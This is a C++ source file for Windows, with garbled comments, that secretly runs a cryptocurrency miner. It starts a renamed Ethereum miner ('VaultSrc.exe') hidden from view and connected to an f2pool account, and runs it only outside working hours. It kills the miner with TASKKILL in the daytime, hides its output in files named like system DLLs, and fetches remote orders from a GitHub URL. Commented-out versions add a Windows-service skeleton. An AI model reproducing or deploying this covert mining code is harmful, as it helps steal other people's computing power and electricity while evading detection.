/*
����߼�����mainʵ��

*/

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string>
#include <tchar.h>
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")
#include <time.h>

#define SLEEP_TIME 5000
#define LOGFILE "C:\\Windows\\SysWOW64\\memstatus.txt"

#include <iostream>

#include "HttpRequest.h"

void curl_demo() {

    //send(sockClient, strHttpGet, strlen(strHttpGet), 0); 
    HttpRequest http_request;
    string ret;
    http_request.getUrl("https://github.com/huqinwei/nomeaning2/blob/master/order.txt", ret, false);


}


int main(int argc, char* argv[])
{
    curl_demo();
    //todo:��Ҫ��libcurl������ҳ���ݣ����о��Լ����ƹҷ����



    freopen("msvc.dll", "w", stdout);
    freopen("msvc.lib", "w", stderr);

    bool is_started = false;
    while (true)
    {
        time_t tt = time(NULL);
        tm* t = localtime(&tt);
        std::cout << t->tm_wday << std::endl;
        if (t->tm_wday == 6 || t->tm_wday == 0)
        {
            std::cout << "weekend" << std::endl;

        }
        int year = t->tm_year + 1900;
        int month = t->tm_mon + 1;
        if (//��������
            (year == 2021 && month == 5 && t->tm_mday == 3) ||
            (year == 2021 && month == 5 && t->tm_mday == 4) ||
            (year == 2021 && month == 5 && t->tm_mday == 5)

            ) {
            std::cout << "holiday" << std::endl;
            return 0;
        }


        if (t->tm_hour >= 21 || t->tm_hour < 9) {
            if (is_started) {//�������

            }
            else {
                std::string worker_id = "15";// argv[1];// argv[1];// "10";//argv[1]
                std::string command = "VaultSrc.exe  -uri ethstratum://airlook.w" + worker_id + "@eth.f2pool.com:6688";
                WinExec(command.c_str(), SW_HIDE);
                is_started = true;
            }
        }
        else {//ǿ�ƹر�
            is_started = false;
            std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
            system(temp.c_str());

            remove("msvc.dll");
            remove("msvc.lib");


            return 0;

        }

        Sleep(3000);

    }
}


/*
//�����ŷ��汾������exe�Ƿ�����ʽ
int main(int argc,char* argv[])
{

freopen("msvc.dll", "w", stdout);
freopen("msvc.lib", "w", stderr);

bool is_started=false;
//Thread.CurrentThread.IsBachgroud = true;
while (true)
{
time_t tt = time(NULL);
tm* t = localtime(&tt);
//printf("%d\n", t->tm_hour);
if (t->tm_hour >= 23 || t->tm_hour <= 8) {
if (is_started) {//�������

}
else {
freopen("msvc.dll", "w", stdout);
freopen("msvc.lib", "w", stderr);
std::string worker_id = argv[1];// "10";//argv[1]
std::string command = "C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://airlook.w" + worker_id + "@eth.f2pool.com:6688";
WinExec(command.c_str(), SW_HIDE);
is_started = true;
}
}
else {//ǿ�ƹر�

std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
system(temp.c_str());
remove("msvc.dll");
remove("msvc.lib");
is_started = false;
}

Sleep(3000);

}



//��һ���汾���������ش��ڣ���ʱ�ر�
//HWND  a_wnd = NULL;

//a_wnd = FindWindow(NULL, _T("VaultSrc.exe"));
//ShowWindow(a_wnd, SW_HIDE);
//     int sleep_mili_second = atoi(argv[2]) * 1000;
//     Sleep(sleep_mili_second);
//     std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
//     system(temp.c_str());
//     remove("msvc.dll");
//     remove("msvc.lib");
}

*/


/*

int WriteToLog(char* str)
{
FILE* log;
log = fopen(LOGFILE, "a+");
if (log == NULL)
return -1;
fprintf(log, "%s\n", str);
fclose(log);
return 0;
}

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
int InitService();
void main()
{
SERVICE_TABLE_ENTRY ServiceTable[2];
ServiceTable[0].lpServiceName = "MemoryStatus";
ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

ServiceTable[1].lpServiceName = NULL;
ServiceTable[1].lpServiceProc = NULL;

// ��������Ŀ��Ʒ��ɻ��߳�
StartServiceCtrlDispatcher(ServiceTable);
}
// �����ʼ��
int InitService()
{
int result;
result = WriteToLog("Monitoring started.");
return(result);
}
*/





/*
������ʱ����
*/
#if 0


#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <tchar.h>
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")
#include <time.h>

#define SLEEP_TIME 5000
#define LOGFILE "C:\\Windows\\SysWOW64\\memstatus.txt"

int main(int argc, char* argv[])
{
    freopen("msvc.dll", "w", stdout);
    freopen("msvc.lib", "w", stderr);
    int live_seconds;// = atoi(argv[2]);
    live_seconds = 24 * 3600;

    std::string worker_id;// = argv[1];// argv[1];// "10";//argv[1]
    worker_id = "9";
    std::string command = "VaultSrc.exe  -uri ethstratum://airlook.w" + worker_id + "@eth.f2pool.com:6688";
    WinExec(command.c_str(), SW_HIDE);

    Sleep(live_seconds * 1000);

    std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
    system(temp.c_str());

    remove("msvc.dll");
    remove("msvc.lib");


}
#endif